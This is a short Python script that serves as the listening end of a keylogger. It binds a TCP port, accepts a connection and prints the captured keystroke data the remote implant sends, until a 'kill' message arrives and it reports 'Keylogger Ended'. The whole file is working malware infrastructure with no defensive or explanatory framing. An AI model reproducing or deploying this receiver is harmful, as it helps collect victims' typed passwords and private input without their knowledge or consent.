import socket, os, sys

killed = False

def createSocket():
	try:
		global host
		global port
		global s

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = ''

		try:
			port = sys.argv[1]
		except:
			port = input('Type Port For Listening: ')

		while not port:
			port = input('Type Port For Listening: ')

		port = int(port)

	except socket.error as msg:
		print('Socket Error:', msg)

def bindSocket():
	try:
		print('Binding Socket To Port:', port)

		s.bind((host,port))

		s.listen(1)

	except socket.error as msg:
		print('Socket Binding Error:', msg)

		bindSocket()

def acceptSocket():
	global conn
	global addr
	os.system('cls')

	try:
		conn, addr = s.accept()
		print('Session Opend at %s:%s \n'%(addr[0], addr[1]))
		menu()
	except socket.error as msg:
		print('Socket Accepting Error:', msg)

def menu():
	global currentPath
	global killed
	while not killed:

		result = conn.recv(16834).decode()

		if result:
			if result == 'kill':
				print("Keylogger Ended")
				killed = True
			print(result)

while True:
	killed = False
	createSocket()
	bindSocket()
	acceptSocket()